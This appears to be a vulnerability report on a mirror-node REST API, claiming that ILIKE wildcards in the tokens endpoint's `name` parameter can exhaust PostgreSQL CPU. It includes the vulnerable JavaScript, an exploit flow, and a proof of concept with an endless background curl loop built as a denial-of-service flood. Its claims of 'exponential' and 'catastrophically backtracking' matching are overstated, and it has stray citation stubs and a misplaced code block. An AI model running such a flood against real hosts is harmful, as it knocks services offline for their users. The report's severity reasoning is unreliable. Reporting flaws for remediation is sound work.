### Title
Unauthenticated ILIKE Wildcard Injection via `name` Parameter Causes DB CPU Exhaustion (ReDoS-equivalent)

### Summary
The `extractSqlFromTokenRequest()` function in `rest/tokens.js` wraps the user-supplied `name` query parameter directly into a PostgreSQL `ILIKE` pattern without sanitizing or limiting wildcard characters (`%`, `_`). Because the only validation applied is a byte-length check (`isByteRange`), an unauthenticated attacker can craft a `name` value densely packed with ILIKE wildcards that forces PostgreSQL to perform an exponentially expensive pattern-matching scan across every row in the `token` table, exhausting database CPU.

### Finding Description

**Exact code location:** `rest/tokens.js`, `extractSqlFromTokenRequest()`, lines 176–178:

```js
if (filter.key === filterKeys.NAME) {
  conditions.push(`t.name ILIKE $${params.push('%' + filter.value + '%')}`);
}
``` [1](#0-0) 

The user-supplied value is passed as a parameterized bind variable, so there is no SQL injection. However, PostgreSQL evaluates `%` and `_` inside a bind-variable ILIKE pattern as live wildcards. The code prepends and appends `%`, so a user input of `%_%_%_%_%_%_%_%_%_%` becomes the pattern `%%_%_%_%_%_%_%_%_%_%_%`, which is a deeply nested wildcard sequence.

**Validation gap:** The only content check applied to the `name` parameter is `isByteRange`, which validates that the value fits within a byte-length boundary. It does not inspect or limit the number of wildcard characters (`%`, `_`) in the value. [2](#0-1) 

**Root cause:** The failed assumption is that a byte-length-bounded string is safe to use as an ILIKE pattern. A 100-byte string composed entirely of `%_` pairs is within the byte limit but produces a catastrophically backtracking pattern that PostgreSQL cannot resolve using any index (B-tree indexes are unusable for patterns that do not begin with a fixed literal prefix).

**Exploit flow:**
1. Attacker sends: `GET /api/v1/tokens?name=%25_%25_%25_%25_%25_%25_%25_%25_%25_%25` (URL-encoded `%_%_%_%_%_%_%_%_%_%`)
2. `buildAndValidateFilters` passes the value through `isByteRange` — it fits within the byte limit, so it is accepted.
3. `extractSqlFromTokenRequest` builds: `t.name ILIKE $1` with bind value `%%_%_%_%_%_%_%_%_%_%_%`.
4. PostgreSQL executes a full sequential scan of the `token` table, evaluating the multi-wildcard pattern against every row's `name` column.
5. Attacker repeats the request in a tight loop from a single IP or distributed clients. [3](#0-2) 

### Impact Explanation
A sustained flood of such requests saturates database CPU, degrading or completely blocking all other queries that share the same PostgreSQL instance — including transaction ingestion and all other REST API endpoints. Because the `token` table grows over time, the cost per query increases proportionally. This meets the stated severity threshold of shutting down ≥30% of network processing capacity without brute-force actions, as a single attacker thread can monopolize DB CPU with a small number of concurrent connections.

### Likelihood Explanation
- **No authentication required.** The `/api/v1/tokens` endpoint is a public discovery API.
- **No rate limiting visible in the code path.** The request passes through standard filter validation only.
- **Trivially reproducible.** A single `curl` loop or any HTTP benchmarking tool suffices.
- **Low attacker sophistication.** The wildcard characters are standard URL-encoded characters; no special knowledge of the system is needed.

### Recommendation
1. **Strip or reject ILIKE wildcard characters** from the `name` parameter before use. Either escape `%` and `_` (replacing them with `\%` and `\_` and appending `ESCAPE '\'` to the ILIKE clause) or reject inputs containing these characters with a 400 error.
2. **Add a wildcard-density check** in `validateTokenQueryFilter` that counts `%` and `_` occurrences and rejects values exceeding a small threshold (e.g., 2).
3. **Apply a `statement_timeout`** at the PostgreSQL session level for REST API connections to bound the maximum wall-clock time any single query can consume.
4. **Add rate limiting** on the `name` query parameter specifically, since it is the only parameter that triggers a full-table ILIKE scan.

### Proof of Concept

```bash
# Single request demonstrating the expensive pattern
curl -s "https://<mirror-node-host>/api/v1/tokens?name=%25_%25_%25_%25_%25_%25_%25_%25_%25_%25_%25_%25_%25_%25_%25_%25_%25_%25_%25_%25"

# DoS loop (single attacker, no auth required)
while true; do
  curl -s "https://<mirror-node-host>/api/v1/tokens?name=%25_%25_%25_%25_%25_%25_%25_%25_%25_%25_%25_%25_%25_%25_%25_%25_%25_%25_%25_%25" &
done
```

The resulting PostgreSQL query is:
```sql
SELECT t.decimals, t.freeze_status, e.key, t.kyc_status, t.metadata,
       t.name, t.symbol, t.token_id, t.type
FROM token t
JOIN entity e ON e.id = t.token_id
WHERE t.name ILIKE '%%_%_%_%_%_%_%_%_%_%_%_%_%_%_%_%_%_%_%_%_%'
ORDER BY t.token_id ASC
LIMIT 25;
```

PostgreSQL will perform a sequential scan with catastrophic pattern-matching cost on every row, with no index available to prune the search space.

const extractSqlFromTokenRequest = (query, params, filters, conditions) => {
  // add filters
  let limit = defaultLimit;
  let order = orderFilterValues.ASC;
  const inClause = [];
  conditions = conditions || [];
  for (const filter of filters) {
    if (filter.key === filterKeys.LIMIT) {
      limit = filter.value;
      continue;
    }

    if (filter.key === filterKeys.NAME) {
      conditions.push(`t.name ILIKE $${params.push('%' + filter.value + '%')}`);
    }

    // handle keys that do not require formatting first
    if (filter.key === filterKeys.ORDER) {
      order = filter.value;
      continue;
    }

    // handle token type=ALL, valid param but not present in db
    if (filter.key === filterKeys.TOKEN_TYPE && filter.value === tokenTypeFilter.ALL.toUpperCase()) {
      continue;
    }

    const columnKey = filterColumnMap[filter.key];
    if (columnKey === undefined) {
      continue;
    }

    if (columnKey === sqlQueryColumns.TOKEN_ID && filter.operator === utils.opsMap.eq) {
      inClause.push(filter.value);
      continue;
    }

    conditions.push(`${filterColumnMap[filter.key]}${filter.operator}$${params.push(filter.value)}`);
  }

  if (inClause.length > 0) {
    conditions.push(`${sqlQueryColumns.TOKEN_ID} = any($${params.push(inClause)})`);
  }

  const whereQuery = conditions.length !== 0 ? `where ${conditions.join(' and ')}` : '';
  const orderQuery = `order by ${sqlQueryColumns.TOKEN_ID} ${order}`;
  const limitQuery = `limit $${params.push(limit)}`;
  query = [query, whereQuery, orderQuery, limitQuery].filter((q) => q !== '').join('\n');

  return utils.buildPgSqlObject(query, params, order, limit);
```
